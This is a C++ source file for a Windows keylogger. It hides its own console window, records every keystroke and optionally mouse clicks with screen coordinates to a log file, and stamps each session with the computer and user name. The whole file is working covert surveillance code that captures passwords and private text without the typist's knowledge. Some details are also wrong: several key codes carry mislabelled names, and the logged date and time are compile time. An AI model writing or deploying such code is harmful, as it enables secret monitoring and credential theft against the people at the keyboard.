/**
 * RUBEN WIHLER
 * 08.06.2023
*/

#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
#include <string>

#pragma comment(lib, "user32.lib")

using namespace std;

char *LOG_FILE_PATH = "";
bool MOUSE_LOGGING = false;

void hideConsole();
void writeStartupInfo();
void startLogging();

int main(int argc, char* argv[])
{
    if (argc < 2)
    {
        cout << "format: " << argv[0] << " <log_file_path> [mouse_logging(ON/OFF)]" << endl;
        return 1;
    }

    LOG_FILE_PATH = argv[1];
    
    if (argc > 2)
    {
        MOUSE_LOGGING = (strcmp(argv[2], "ON") == 0 || strcmp(argv[2], "on") == 0 || strcmp(argv[2], "On") == 0);
    }

    hideConsole();
    writeStartupInfo();
    startLogging();
    return 0;
}

void hideConsole()
{
    HWND hConsole;
    AllocConsole();
    hConsole=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(hConsole,0);
}

void startLogging()
{
    char character;
    
    for(;;)
    {
        for(character=8;character<=222;character++)
        {
            if(GetAsyncKeyState(character)==-32767)
            {
                ofstream write(LOG_FILE_PATH, ios::app);
                bool bShiftEnable = (GetAsyncKeyState(0x10) != 0);
                POINT pCursorPosition;
                GetCursorPos(&pCursorPosition);
            
                if(((character>64)&&(character<91))&&!(bShiftEnable))
                {
                    character+=32;
                    write<<character;
                    write.close();
                    break;
                }
                else if((character>64)&&(character<91))
                {
                    write<<character;
                    write.close();
                    break;
                }
                else 
                {
                    switch (character)
                    {
                        case VK_UP:
                            write<<"\n<UP>\n";
                            break;
                        case VK_DOWN:
                            write<<"\n<DOWN>\n";
                            break;
                        case VK_LEFT:
                            write<<"\n<LEFT>\n";
                            break;
                        case VK_RIGHT:
                            write<<"\n<RIGHT>\n";
                            break;
                        case 0x10:
                            break;
                        case 0x11:
                            write<<" CTRL ";
                            break;
                        case 0x12:
                            write<<" ALT ";
                            break;
                        case 0x13:
                            write<<" PAUSE ";
                            break;
                        case 0x14:
                            write<<" CAPS LOCK ";
                            break;
                        case 0x1B:
                            write<<"\n<ESC>\n";
                            break;
                        case 0x1C:
                            write<<"\n<END>\n";
                            break;
                        case 0x1D:
                            write<<"\n<HOME>\n";
                            break;
                        case 0x1E:
                            write<<"\n<INSERT>\n";
                            break;
                        case 0x1F:
                            write<<"\n<DEL>\n";
                            break;
                        case 0x21:
                            write<<"\n<PAGE UP>\n";
                            break;
                        case 0x22:
                            write<<"\n<PAGE DOWN>\n";
                            break;
                        case 0x23:
                            write<<"\n<END>\n";
                            break;
                        case 0x24:
                            write<<"\n<HOME>\n";
                            break;
                        case 0x29:
                            write<<"\n<IME SELECT>\n";
                            break;
                        case 0x01:
                        {
                            if (MOUSE_LOGGING)
                                write<<"\n<LEFT-CLICK ("<<pCursorPosition.x<<","<<pCursorPosition.y<<")>\n";
                            break;
                        }
                        case 0x02:
                        {
                            if (MOUSE_LOGGING)
                                write<<"\n<RIGHT-CLICK ("<<pCursorPosition.x<<","<<pCursorPosition.y<<")>\n";
                            break;
                        }
                        case 0x03:
                            write<<"\n<CANCEL>\n";
                            break;
                        case 0x04:
                        {
                            if (MOUSE_LOGGING)
                                write<<"\n<MIDDLE-CLICK ("<<pCursorPosition.x<<","<<pCursorPosition.y<<")>\n";
                            break;
                        }
                        case 48:
                        {
                            if(bShiftEnable)
                                write<<")";
                            else
                                write<<"0";    
                        }   
                        break;

                        case 49:
                        {
                            if(bShiftEnable)
                                write<<"!";
                            else
                                write<<"1";    
                        }   
                        break;

                        case 50:
                        {
                            if(bShiftEnable)
                                write<<"@";
                            else
                                write<<"2";    
                        }
                        break;
                        
                        case 51:
                        {
                            if(bShiftEnable)
                                write<<"#";
                            else
                                write<<"3";    
                        }   
                        break;

                        case 52:
                        {
                            if(bShiftEnable)
                                write<<"$";
                            else
                                write<<"4";    
                        }
                        break;  
                        
                        case 53:
                        {
                            if(bShiftEnable)
                                write<<"%";
                            else
                                write<<"5";    
                        }   
                        break;

                        case 54:
                        {
                            if(bShiftEnable)
                                write<<"^";
                            else
                                write<<"6";    
                        }
                        break;
                        
                        case 55:
                        {
                            if(bShiftEnable)
                                write<<"&";
                            else
                                write<<"7";    
                        }   
                        break;
                        
                        case 56:
                        {
                            if(bShiftEnable)
                                write<<"*";
                            else
                                write<<"8";    
                        }   
                        break;
                        
                        case 57:
                        {
                            if(bShiftEnable)
                                write<<"(";
                            else
                                write<<"9";    
                        }   
                        break;

                        case VK_SPACE:
                            write<<" ";
                            break;
                        case VK_RETURN:
                            write<<"\n";
                            break;  
                        case VK_TAB:
                            write<<"  ";
                            break;
                       case VK_BACK:
                            write<<"\n<BACKSPACE>\n";
                            break;
                        case VK_DELETE:
                            write<<"\n<Del>\n";
                            break;
                        case VK_OEM_1:
                            write<<" ;:";
                            break;
                        case VK_OEM_2:
                            write<<" /?";
                            break;
                        case VK_OEM_3:
                            write<<"`~";
                            break;
                        case VK_OEM_4:
                            write<<" [{";
                            break;
                        case VK_OEM_5:
                            write<<" \\|";
                            break;
                        case VK_OEM_6:
                            write<<" ]}";
                            break;
                        case VK_OEM_7:
                            write<<" ' \"";
                            break;
                        case VK_OEM_PLUS:
                            write<<" +=";
                            break;
                        case VK_OEM_COMMA:
                            write<<" ,<";
                            break;
                        case VK_OEM_MINUS:
                            write<<" -_";
                            break;
                        case VK_OEM_PERIOD:
                            write<<" .>";
                            break;
                        case VK_NUMPAD0:
                            write<<"0";
                            break;
                        case VK_NUMPAD1:
                            write<<"1";
                            break;
                        case VK_NUMPAD2:
                            write<<"2";
                            break;
                        case VK_NUMPAD3:
                            write<<"3";
                            break;
                        case VK_NUMPAD4:
                            write<<"4";
                            break;
                        case VK_NUMPAD5:
                            write<<"5";
                            break;
                        case VK_NUMPAD6:
                            write<<"6";
                            break;
                        case VK_NUMPAD7:
                            write<<"7";
                            break;
                        case VK_NUMPAD8:
                            write<<"8";
                            break;
                        case VK_NUMPAD9:
                            write<<"9";
                            break;

                        default:
                            write<<character; 
                    }
                }
           }
        }
    }
}

void writeStartupInfo(){
    ofstream write(LOG_FILE_PATH, ios::app);

    write<<"\n -------- session started -------- \n";
    write<<"Computer Name: "<<getenv("COMPUTERNAME")<<endl;
    write<<"OS: Windows"<<endl;
    write<<"User: "<<getenv("USERNAME")<<endl;
    write<<"Date: "<<__DATE__<<endl;
    write<<"Time: "<<__TIME__<<endl;
    
    write.close();
}
